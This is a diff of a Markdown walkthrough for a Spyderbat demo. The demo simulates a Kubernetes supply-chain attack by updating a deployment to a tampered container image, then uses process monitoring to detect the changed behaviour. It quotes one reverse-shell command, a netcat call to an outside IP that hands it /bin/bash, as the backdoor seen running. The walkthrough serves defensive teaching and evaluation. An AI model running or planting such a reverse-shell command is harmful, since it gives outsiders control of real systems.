@@ -2,12 +2,6 @@
 
 This scenario demonstrates a supply chain attack where a container image is getting an update with malicious code to create a backdoor to a kubernetes cluster environment. It shows how through the use of policies for applications running on the cluster, unanticipated changes in the behavior of these application can be detected early and remediated.
 
-## Pre-requisites
-You will need
-- a cluster where you can deploy services, deployments, pods, with access to docker image hub for pulling images
-- a kubectl client
-- a kubectl configuration with its current context pointing to the cluster
-
 ## Initial setup
 
 If you have not yet done the inital installation steps for these attack scenarios, refer to [Spyderbat eval repository](https://github.com/spyderbat/eval)
@@ -16,7 +10,8 @@ If your setup was successful, you should see a namespace called `supply-chain` i
 
 ```sh
 kubectl get all -n supply-chain
-
+```
+```
 NAME                            READY   STATUS    RESTARTS   AGE
 pod/mongodb-66b5d7df55-b6q5j    1/1     Running   0          18h
 pod/rsvp-app-587559dbf4-fnvzq   1/1     Running   0          18h
@@ -36,6 +31,7 @@ replicaset.apps/rsvp-app-587559dbf4   2         2         2       18h
 ```
 
 ## Inspecting the setup
+
 We can have a look at what this looks like in the cluster, and what processes are running in the Spyderbat Console.
 
 Log in to the console, click on the Kubernetes menu item in the navigation bar, pick your cluster in the Cluster dropdown, and click on New Search.
@@ -53,12 +49,20 @@ Let's have a closer look at the web tier, and inspect the manifest of the pod. C
 We can see the app is running an image `guyduchatelet/spyderbat-demo:1`
 
 We can assess what is running in this image by inspecting the container that is running it. Right-click on the container and select 'investigate container'
+
+<div style="display:flex;justify-content:center">
+
 ![investigate container](./supply_chain_3.png)
+
+</div>
 
 This brings us to a process view of everything running inside of the container:
 
+<div style="display:flex;justify-content:center">
+
 ![container process view](./supply_chain_4.png)
 
+</div>
 We can tell from this the entrypoint of the container spawns a python process, and another child python process to run the web
 server. That is the normal state of this web server container
 
@@ -73,7 +77,7 @@ of the image.
 
 Let's simulate that action by updating the web deployment to use a more recent version of the image.
 
-Find the file supply-chain.yaml under the modules directory of the eval repo, and open it up in your editor of choice.
+Find the file `supply-chain.yaml` under the modules directory of the eval repo, and open it up in your editor of choice.
 
 Look for the deployment definition with name 'rsvp-app', and find the spec section. In the container properties, update the image from
 `guyduchatelet/spyderbat-demo:1` to `guyduchatelet/spyderbat-demo:2`
@@ -82,13 +86,15 @@ After saving, now let's apply this change to the cluster:
 
 ```sh
 kubectl apply -f supply-chain.yaml
-
+```
+```
 namespace/supply-chain unchanged
 deployment.apps/mongodb unchanged
 service/mongodb unchanged
 deployment.apps/rsvp-app configured
 service/rsvp-app unchanged
 ```
+
 We can see that the rsvp-app deployment is getting updated. The existing pods will be removed, and new pods will take their place.
 
 ## Investigating the Results
@@ -106,10 +112,13 @@ On the left, we see the old deployment, on the right the new deployment came in.
 Let's pivot again into the full process view inside the container. Pick a container and inspect it again as before to look at the processes running inside. Here's what we see:
 
 ![compromised container process view](./supply_chain_5.png)
+
 Clearly the behavior of this image has changed, it's no longer just running a python web server but is running several suspicious commands. We can see it is running a netcat command
-```bash
+
+```sh
 /tmp/nc 54.161.223.45 443 -e /bin/bash
 ```
+
 Which seems to have succeed in creating a backdoor towards a system on the internet.
 
 ## Next Steps
